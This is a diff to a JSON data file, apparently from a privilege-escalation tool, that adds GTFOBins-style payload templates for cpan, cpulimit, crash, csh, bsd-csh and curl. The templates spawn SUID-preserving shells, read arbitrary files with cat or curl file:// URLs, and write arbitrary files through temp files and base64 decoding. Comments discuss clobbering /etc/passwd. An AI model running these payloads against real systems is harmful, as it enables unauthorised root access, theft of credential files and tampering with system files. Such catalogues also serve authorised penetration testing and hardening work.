@@ -86,7 +86,7 @@
 		},
 		{
 			"type": "read",
-			"stream": "print",
+			"stream": "raw",
 			"payload": "{command}",
 			"args": ["-c", "'{cat} {lfile}'"],
 			"suid": ["-p"]
@@ -364,15 +364,129 @@
 			"exit": "exit\n"
 		}
 
-		// Could we do some file_read and file_write with this too..?
+		// Could we do some file_read and file_write with this too..? We can run cobol...
 	],
 //-------------------------------------------------------------------
-	// "cpan": [
-	// 	{
-	// 		"type": "shell",
-	// 		"payload": "{command}",
-	// 		"input" : "! exec {shell} -p\n",
-	// 		"exit": "exit\n"
-	// 	}
-	// ]
+	"cpan": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"input" : "! system(\"{shell} -p\")\n",
+			// exit the shell, AND exit cpan
+			"exit": "exit\nexit\n"
+		}
+
+		// Could we do some file_read and file_write with this too? We can run perl...
+	],
+//-------------------------------------------------------------------
+	"cpulimit": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-l", "100", "-f", "\"{shell}\""],
+			// exit the shell, AND exit cpan
+			"exit": "exit\n"
+		}
+		// We cannot seem to pass other arguments to process ran, so no read/write (???)
+	],
+//-------------------------------------------------------------------
+	"crash": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-h"],
+			"input": "!{shell} -p\n",
+			// exit the shell, AND exit cpan
+			"exit": "exit\nq\n"
+		}
+		// We cannot seem to pass other arguments to process ran, so no read/write (???)
+	],
+//-------------------------------------------------------------------
+	"csh": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"suid": ["-b"],
+			"input": "{shell} -p\n",
+			// exit the shell, AND exit csh
+			"exit": "exit\nexit\n"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			// "suid" is not supplied because it must be very last argument
+			"args": ["-c", "\"{cat} {lfile}\"", "-b"]
+		}
+		// Using write, it doesn't get the entire text to clobber /etc/passwd
+		// {
+		// 	"type": "write",
+		// 	"stream": "base64",
+		// 	"payload": "{command}",
+		// 	"args": ["-c", "\"{base64} -d > {lfile}\"", "-b"],
+		// 	// "suid" is not supplied because it must be very last argument
+		// 	"exit": "{ctrl_d}"
+		// }
+	],
+	"bsd-csh": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"input": "{shell} -p\n",
+			"suid": ["-b"],
+			// exit the shell, AND exit csh
+			"exit": "exit\nexit\n"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			// "suid" is not supplied because it must be very last argument
+			"args": ["-c", "\"{cat} {lfile}\"", "-b"]
+		}
+		// Using write, it doesn't get the entire text to clobber /etc/passwd
+		// {
+		// 	"type": "write",
+		// 	"stream": "base64",
+		// 	"payload": "{command}",
+		// 	"args": ["-c", "\"{base64} -d > {lfile}\"", "-b"],
+		// 	// "suid" is not supplied because it must be very last argument
+		// 	"exit": "{ctrl_d}"
+		// }
+	],
+//-------------------------------------------------------------------
+	"curl": [
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command}",
+			"args": ["-s", "file://{lfile} --output -"]
+		},
+		{
+			"type": "read",
+			"stream": "base64",
+			"payload": "{command}",
+			"args": ["-s", "file://{lfile} --output - | {base64} -w 0"]
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			// This is weird because under the case where we are running w/ sudo,
+			// we need to ask for the password first. The first "{command}" will
+			// ask for the sudo password, then fail. The second "{command}"
+			// will not ask for the sudo password, and then the copy will succeed.
+			// Without sudo, the first command will simply fail, and the second
+			// will succeed. This is the same for the other payload below.
+			"payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {cat} > $TF; {command}; rm -f $TF",
+			"args": ["-s", "file://$TF --output {lfile}"],
+			"exit": "{ctrl_d}"
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {base64} -d > $TF; {command}; rm -f $TF",
+			"args": ["-s", "file://$TF --output {lfile}"],
+			"exit": "{ctrl_d}"
+		}
+	]
 }
